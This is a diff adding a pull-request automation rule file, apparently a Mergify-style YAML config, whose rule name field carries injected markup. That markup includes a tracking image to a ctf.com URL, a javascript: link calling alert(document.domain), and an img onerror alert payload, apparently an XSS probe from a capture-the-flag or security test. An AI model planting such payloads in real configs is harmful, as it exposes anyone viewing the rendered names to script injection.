@@ -1,0 +1,10 @@
+pull_request_rules:
+  - name: "![Click](https://ctf.com/x.png?log=1)
+      [Contribuir](javascript:alert(document.domain)) <img src=x
+      onerror=alert(1)>"
+    conditions:
+      - base=main
+    actions:
+      label:
+        add:
+          - bug
